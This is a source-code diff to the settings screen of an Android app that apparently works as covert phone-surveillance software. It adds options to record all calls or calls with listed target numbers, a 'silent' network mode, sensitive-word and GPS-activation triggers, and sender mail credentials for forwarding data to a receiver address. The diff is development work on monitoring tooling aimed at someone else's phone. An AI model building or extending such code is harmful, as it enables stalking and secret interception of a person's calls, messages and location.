@@ -4,7 +4,9 @@ import java.util.Date;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
+import android.app.AlertDialog;
 import android.content.Context;
+import android.content.DialogInterface;
 import android.content.Intent;  
 import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
@@ -31,15 +33,13 @@ import com.particle.inspector.common.util.license.LICENSE_TYPE;
   
 public class GlobalPrefActivity extends PreferenceActivity 
 {
+	private final static String LOGTAG = "GlobalPrefActivity";
+	private Context context;
 	private OnSharedPreferenceChangeListener chgListener;
-	private static String SENDER_MAIL;
-	private static String SENDER_PWD;
-	private static String RECV_MAIL;
-	private static String INTERVAL_INFO;
-	private static String REDIRECT_PHONE_NUM;
-	private static String SENSITIVE_WORDS;
-	private static String GPS_WORD;
+	
 	public static final String HAS_CHG_RECEIVER_INFO = "has_changed_receiver_info"; // mail, phone number, GPS word
+	public static final String TARGET_NUMBER_BREAKER = " ";
+	public static final int MAX_TARGET_NUM_COUNT = 9;
 	public static final String SENSITIVE_WORD_BREAKER = " ";
 	public static final int MAX_SENSITIVE_WORD_COUNT = 9;
 	public static final int GPS_WORD_MAX_LEN = 24;
@@ -47,6 +47,8 @@ public class GlobalPrefActivity extends PreferenceActivity
 	@Override
 	public void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
+		
+		context = getApplicationContext();
 		// All values will be automatically saved to SharePreferences
 		addPreferencesFromResource(R.xml.preference);
 		
@@ -57,74 +59,96 @@ public class GlobalPrefActivity extends PreferenceActivity
         }
 		
 		// Show special summary
-		//String summary = getResources().getString(R.string.pref_word_sensor_summary);
-		//((PreferenceCategory)this.getPreferenceScreen().getPreference(prefCount-1)).getPreference(1).setSummary(summary);
+		setSpecialSummary();
 		
-		// Disable sender mail&password by default
-		setSenderMailState(getPreferenceScreen().getSharedPreferences());
+		// Set state of recording target number
+		//SharedPreferences sp = getPreferenceScreen().getSharedPreferences();
+		SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(this);
+		setRecordTargetNumState(sp, this);
+		
+		// Set state of sender mail&password
+		setSenderMailState(sp, this);
 		
 		// Register	preference change listener
-		SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(this);
 		chgListener = new OnSharedPreferenceChangeListener(){
 			@SuppressWarnings("unused")
 			@Override
 			public void onSharedPreferenceChanged(SharedPreferences sharedPreferences, String key) {
+				if (context == null) context = getApplicationContext();
 				if (key.equals("pref_use_self_sender")) {
-					setSenderMailState(sharedPreferences);
+					setSenderMailState(sharedPreferences, GlobalPrefActivity.this);
 				}
-				else if (key.equals(getResources().getString(R.string.pref_sender_mail_key))) {
-					String oriSenderMail = sharedPreferences.getString(getResources().getString(R.string.pref_sender_mail_key), "");
+				else if (key.equals("pref_sender_mail")) {
+					String oriSenderMail = sharedPreferences.getString("pref_sender_mail", "");
 					String senderMail = oriSenderMail.trim();
 					if(!StrUtils.validateMailAddress(senderMail)) {
 						String msg = String.format(getResources().getString(R.string.pref_invalid_mail_format), senderMail);
-						SysUtils.messageBox(getApplicationContext(), msg);
+						SysUtils.messageBox(context, msg);
 					}
 				}
-				else if (key.equals(getResources().getString(R.string.pref_sender_pwd_key))) {
-					String oriSenderPwd = sharedPreferences.getString(getResources().getString(R.string.pref_sender_pwd_key), "");
+				else if (key.equals("pref_sender_pwd")) {
+					String oriSenderPwd = sharedPreferences.getString("pref_sender_pwd", "");
 					String senderPwd = oriSenderPwd.trim();
 					if (senderPwd.length() <= 0) {
-						SysUtils.messageBox(getApplicationContext(), getResources().getString(R.string.pref_pls_input_pwd));
+						SysUtils.messageBox(context, getResources().getString(R.string.pref_pls_input_pwd));
 					}
 				}
-				else if (key.equals(getResources().getString(R.string.pref_recv_mail_key))) {
-					checkMailFormat(sharedPreferences, getApplicationContext());
+				else if (key.equals("pref_recv_mail")) {
+					checkRecvMailFormat(sharedPreferences, context);
 					enableReceiverInfoChgFlag();
 				}
-				else if (key.equals(getResources().getString(R.string.pref_info_interval_key))) {
-					String intervalStr = sharedPreferences.getString(getResources().getString(R.string.pref_info_interval_key), "1"); //day
-					int interval = Integer.parseInt(intervalStr);
-				}
-				else if (key.equals(getResources().getString(R.string.pref_phonenum_key))) {
-					String oriPhoneNum = sharedPreferences.getString(getResources().getString(R.string.pref_phonenum_key), "");
+				else if (key.equals("pref_recv_phonenum")) {
+					String oriPhoneNum = sharedPreferences.getString("pref_recv_phonenum", "");
 					String phoneNum = oriPhoneNum.trim();
 					if (phoneNum.length() == 0) {
-						SysUtils.messageBox(getApplicationContext(), getResources().getString(R.string.pref_pls_input_phonenum));
+						SysUtils.messageBox(context, getResources().getString(R.string.pref_pls_input_phonenum));
 					}
 					//if (!phoneNum.equals(oriPhoneNum)) setRedirectPhoneNum(getApplicationContext(), phoneNum);
 					if (phoneNum.length() > 0) enableReceiverInfoChgFlag();
 				}
-				else if (key.equals(getResources().getString(R.string.pref_word_sensor_key))) {
-					String oriWords = sharedPreferences.getString(getResources().getString(R.string.pref_word_sensor_key), "");
+				else if (key.equals("pref_info_interval")) {
+					String intervalStr = sharedPreferences.getString("pref_info_interval", "1"); //day
+					int interval = Integer.parseInt(intervalStr);
+				}
+				else if (key.equals("pref_record_all")) {
+					setRecordTargetNumState(sharedPreferences, GlobalPrefActivity.this);
+				}
+				else if (key.equals("pref_record_target_number")) {
+					String oriNumbers = sharedPreferences.getString("pref_record_target_number", "");
+					String numbers = oriNumbers.trim();
+					if (numbers.length() == 0 && !getRecordAll(context)) {
+						SysUtils.messageBox(context, getResources().getString(R.string.pref_pls_input_target_number));
+					} else {
+						numbers = numbers.replaceAll(" {2,}", TARGET_NUMBER_BREAKER); // Remove duplicated blank spaces
+						if (numbers.split(TARGET_NUMBER_BREAKER).length > MAX_TARGET_NUM_COUNT) {
+							String msg = String.format(getResources().getString(R.string.pref_sensitive_words_count_reach_max), MAX_SENSITIVE_WORD_COUNT);
+							String title = context.getResources().getString(R.string.warning);
+							SysUtils.warningDlg(context, title, msg);
+						}
+					}
+				}
+				else if (key.equals("pref_sensitive_words")) {
+					String oriWords = sharedPreferences.getString("pref_sensitive_words", "");
 					String words = oriWords.trim();
 					if (words.length() == 0) {
-						SysUtils.messageBox(getApplicationContext(), getResources().getString(R.string.pref_pls_input_sensitive_words));
+						SysUtils.messageBox(context, getResources().getString(R.string.pref_pls_input_sensitive_words));
 					} else {
 						words = words.replaceAll(" {2,}", SENSITIVE_WORD_BREAKER); // Remove duplicated blank spaces
 						if (words.split(SENSITIVE_WORD_BREAKER).length > MAX_SENSITIVE_WORD_COUNT) {
 							String msg = String.format(getResources().getString(R.string.pref_sensitive_words_count_reach_max), MAX_SENSITIVE_WORD_COUNT);
-							SysUtils.messageBox(getApplicationContext(), msg);
+							String title = context.getResources().getString(R.string.warning);
+							SysUtils.warningDlg(context, title, msg);
 						}
 					}
 					//if (!words.equals(oriWords)) setSensitiveWords(getApplicationContext(), words);
 				}
-				else if (key.equals(getResources().getString(R.string.pref_activate_word_key))) {
-					String oriWord = sharedPreferences.getString(getResources().getString(R.string.pref_activate_word_key), "");
+				else if (key.equals("pref_gps_word")) {
+					String oriWord = sharedPreferences.getString("pref_gps_word", "");
 					String word = oriWord.trim();
 					if (word.length() == 0) {
-						SysUtils.messageBox(getApplicationContext(), getResources().getString(R.string.pref_pls_input_gps_activate_word));
+						SysUtils.messageBox(context, getResources().getString(R.string.pref_pls_input_gps_activate_word));
 					} else if (word.length() > GPS_WORD_MAX_LEN) {
-						SysUtils.messageBox(getApplicationContext(), getResources().getString(R.string.pref_gps_activate_word_max_len));
+						SysUtils.messageBox(context, getResources().getString(R.string.pref_gps_activate_word_max_len));
 					}
 					//if (!word.equals(oriWord)) setGpsWord(getApplicationContext(), word);
 					if (word.length() > 0) enableReceiverInfoChgFlag();
@@ -135,7 +159,7 @@ public class GlobalPrefActivity extends PreferenceActivity
 		            initSummary(getPreferenceScreen().getPreference(i));
 		        }
 				
-			}
+			}			
         };
 		sp.registerOnSharedPreferenceChangeListener(chgListener);
 	}
@@ -170,9 +194,9 @@ public class GlobalPrefActivity extends PreferenceActivity
 		}
 	}
 	
-	private boolean checkMailFormat(SharedPreferences sharedPreferences, Context context) {
+	private boolean checkRecvMailFormat(SharedPreferences sharedPreferences, Context context) {
 		boolean valid = true;
-		String oriMail = sharedPreferences.getString(getResources().getString(R.string.pref_recv_mail_key), "");
+		String oriMail = sharedPreferences.getString("pref_recv_mail", "");
 		String mail = oriMail.trim();
 		//if (!mail.equals(oriMail)) setMail(context, mail);
 		String[] mails = mail.split(",");
@@ -192,7 +216,7 @@ public class GlobalPrefActivity extends PreferenceActivity
 	    return valid;
 	}
 	
-	private void setSenderMailState(SharedPreferences sharedPreferences) {
+	private void setSenderMailState(SharedPreferences sharedPreferences, Context context) {
 		boolean useSelfSender = sharedPreferences.getBoolean("pref_use_self_sender", false);
 		if(useSelfSender) {
 			((PreferenceCategory)getPreferenceScreen().getPreference(0)).getPreference(1).setEnabled(true);
@@ -200,7 +224,48 @@ public class GlobalPrefActivity extends PreferenceActivity
 		} else {
 			((PreferenceCategory)getPreferenceScreen().getPreference(0)).getPreference(1).setEnabled(false);
 			((PreferenceCategory)getPreferenceScreen().getPreference(0)).getPreference(2).setEnabled(false);
+			
+			// If not use self sender, cannot record all phone calls
+			if (getRecordAll(context)) {
+				String title = context.getResources().getString(R.string.warning);
+				String msg   = context.getResources().getString(R.string.pref_must_use_self_sender);
+				setRecordAll(context, false);
+				this.getListView().scrollTo(0, 800);
+				SysUtils.messageBox(context, title + ": " + msg);
+			}
 		}
+	}
+	
+	private void setRecordTargetNumState(SharedPreferences sharedPreferences, Context context) {
+		boolean recordAll = sharedPreferences.getBoolean("pref_record_all", false);
+		if(recordAll) {
+			// Must use self sender if recording all phone calls
+			if (!getUseSelfSender(context)               ||
+				getSenderMail(context).length()     <= 0 ||
+				getSenderPassword(context).length() <= 0) 
+			{	
+				String title = context.getResources().getString(R.string.warning);
+				String msg   = context.getResources().getString(R.string.pref_must_use_self_sender);
+				setUseSelfSender(context, true);
+				this.getListView().scrollTo(0, 0);// Go to top
+				SysUtils.messageBox(context, title + ": " + msg);
+			}
+			
+			((PreferenceCategory)getPreferenceScreen().getPreference(3)).getPreference(1).setEnabled(true);
+		} else {
+			((PreferenceCategory)getPreferenceScreen().getPreference(3)).getPreference(1).setEnabled(false);
+		}
+	}
+	
+	private void setSpecialSummary() {
+		String summary = getResources().getString(R.string.pref_record_number_summary);
+		((PreferenceCategory)this.getPreferenceScreen().getPreference(3)).getPreference(0).setSummary(summary);
+		summary = getResources().getString(R.string.pref_network_mode_summary);
+		((PreferenceCategory)this.getPreferenceScreen().getPreference(4)).getPreference(0).setSummary(summary);
+		summary = getResources().getString(R.string.pref_sensitive_words_summary);
+		((PreferenceCategory)this.getPreferenceScreen().getPreference(5)).getPreference(0).setSummary(summary);
+		summary = getResources().getString(R.string.pref_gps_word_summary);
+		((PreferenceCategory)this.getPreferenceScreen().getPreference(6)).getPreference(0).setSummary(summary);
 	}
 	
 	public static boolean getUseSelfSender(Context context) {
@@ -212,73 +277,88 @@ public class GlobalPrefActivity extends PreferenceActivity
 	}
 	
 	public static String getSenderMail(Context context) {
-		SENDER_MAIL = context.getResources().getString(R.string.pref_sender_mail_key);
-		return PreferenceManager.getDefaultSharedPreferences(context).getString(SENDER_MAIL, "").trim();
+		return PreferenceManager.getDefaultSharedPreferences(context).getString("pref_sender_mail", "").trim();
 	}
 	
 	public static void setSenderMail(Context context, String value) {
-		SENDER_MAIL = context.getResources().getString(R.string.pref_sender_mail_key);
-		PreferenceManager.getDefaultSharedPreferences(context).edit().putString(SENDER_MAIL, value).commit();
+		PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_sender_mail", value).commit();
 	}
 	
 	public static String getSenderPassword(Context context) {
-		SENDER_PWD = context.getResources().getString(R.string.pref_sender_pwd_key);
-		return PreferenceManager.getDefaultSharedPreferences(context).getString(SENDER_PWD, "").trim();
+		return PreferenceManager.getDefaultSharedPreferences(context).getString("pref_sender_pwd", "").trim();
 	}
 	
 	public static void setSenderPassword(Context context, String value) {
-		SENDER_PWD = context.getResources().getString(R.string.pref_sender_pwd_key);
-		PreferenceManager.getDefaultSharedPreferences(context).edit().putString(SENDER_PWD, value).commit();
+		PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_sender_pwd", value).commit();
 	}
 	
 	public static String getReceiverMail(Context context) {
-		RECV_MAIL = context.getResources().getString(R.string.pref_recv_mail_key);
-		return PreferenceManager.getDefaultSharedPreferences(context).getString(RECV_MAIL, "").trim();
+		return PreferenceManager.getDefaultSharedPreferences(context).getString("pref_recv_mail", "").trim();
 	}
 	
 	public static void setReceiverMail(Context context, String value) {
-		RECV_MAIL = context.getResources().getString(R.string.pref_recv_mail_key);
-		PreferenceManager.getDefaultSharedPreferences(context).edit().putString(RECV_MAIL, value).commit();
-	}
-	
-	public static int getInfoInterval(Context context) {
-		INTERVAL_INFO = context.getResources().getString(R.string.pref_info_interval_key);
-		return Integer.parseInt(PreferenceManager.getDefaultSharedPreferences(context).getString(INTERVAL_INFO, "1"));
-	}
-	
-	public static void setInfoInterval(Context context, int value) {
-		INTERVAL_INFO = context.getResources().getString(R.string.pref_info_interval_key);
-		PreferenceManager.getDefaultSharedPreferences(context).edit().putInt(INTERVAL_INFO, value).commit();
+		PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_recv_mail", value).commit();
 	}
 	
 	public static String getReceiverPhoneNum(Context context) {
-		REDIRECT_PHONE_NUM = context.getResources().getString(R.string.pref_phonenum_key);
-		return PreferenceManager.getDefaultSharedPreferences(context).getString(REDIRECT_PHONE_NUM, "").trim();
+		return PreferenceManager.getDefaultSharedPreferences(context).getString("pref_recv_phonenum", "").trim();
 	}
 	
 	public static void setReceiverPhoneNum(Context context, String value) {
-		REDIRECT_PHONE_NUM = context.getResources().getString(R.string.pref_phonenum_key);
-		PreferenceManager.getDefaultSharedPreferences(context).edit().putString(REDIRECT_PHONE_NUM, value).commit();
+		PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_recv_phonenum", value).commit();
+	}
+	
+	public static int getInfoInterval(Context context) {
+		return Integer.parseInt(PreferenceManager.getDefaultSharedPreferences(context).getString("pref_info_interval", "1"));
+	}
+	
+	public static void setInfoInterval(Context context, int value) {
+		PreferenceManager.getDefaultSharedPreferences(context).edit().putInt("pref_info_interval", value).commit();
+	}
+	
+	public static boolean getRecordAll(Context context) {
+		return PreferenceManager.getDefaultSharedPreferences(context).getBoolean("pref_record_all", false);
+	}
+	
+	public static void setRecordAll(Context context, boolean value) {
+		PreferenceManager.getDefaultSharedPreferences(context).edit().putBoolean("pref_record_all", value).commit();
+	}
+	
+	public static String getRecordTargetNum(Context context) {
+		return PreferenceManager.getDefaultSharedPreferences(context).getString("pref_record_target_number", "").trim();
+	}
+	
+	public static void setRecordTargetNum(Context context, String value) {
+		PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_record_target_number", value).commit();
+	}
+	
+	public static NETWORK_CONNECT_MODE getNetworkConnectMode(Context context) {
+		String str = PreferenceManager.getDefaultSharedPreferences(context).getString("pref_network_mode", "silent");
+		if (str.equals("active")) return NETWORK_CONNECT_MODE.ACTIVE;
+		else return NETWORK_CONNECT_MODE.SILENT;
+	}
+	
+	public static void setNetworkConnectMode(Context context, NETWORK_CONNECT_MODE value) {
+		if (value == NETWORK_CONNECT_MODE.ACTIVE)
+			PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_network_mode", "active").commit();
+		else 
+			PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_network_mode", "silent").commit();
 	}
 	
 	public static String getSensitiveWords(Context context) {
-		SENSITIVE_WORDS = context.getResources().getString(R.string.pref_word_sensor_key);
-		return PreferenceManager.getDefaultSharedPreferences(context).getString(SENSITIVE_WORDS, "").trim();
+		return PreferenceManager.getDefaultSharedPreferences(context).getString("pref_sensitive_words", "").trim();
 	}
 	
 	public static void setSensitiveWords(Context context, String value) {
-		SENSITIVE_WORDS = context.getResources().getString(R.string.pref_word_sensor_key);
-		PreferenceManager.getDefaultSharedPreferences(context).edit().putString(SENSITIVE_WORDS, value).commit();
+		PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_sensitive_words", value).commit();
 	}
 	
 	public static String getGpsWord(Context context) {
-		GPS_WORD = context.getResources().getString(R.string.pref_activate_word_key);
-		return PreferenceManager.getDefaultSharedPreferences(context).getString(GPS_WORD, "").trim();
+		return PreferenceManager.getDefaultSharedPreferences(context).getString("pref_gps_word", "").trim();
 	}
 	
 	public static void setGpsWord(Context context, String value) {
-		GPS_WORD = context.getResources().getString(R.string.pref_activate_word_key);
-		PreferenceManager.getDefaultSharedPreferences(context).edit().putString(GPS_WORD, value).commit();
+		PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_gps_word", value).commit();
 	}
 	
 	public static boolean getDisplayGpsSMS(Context context) {
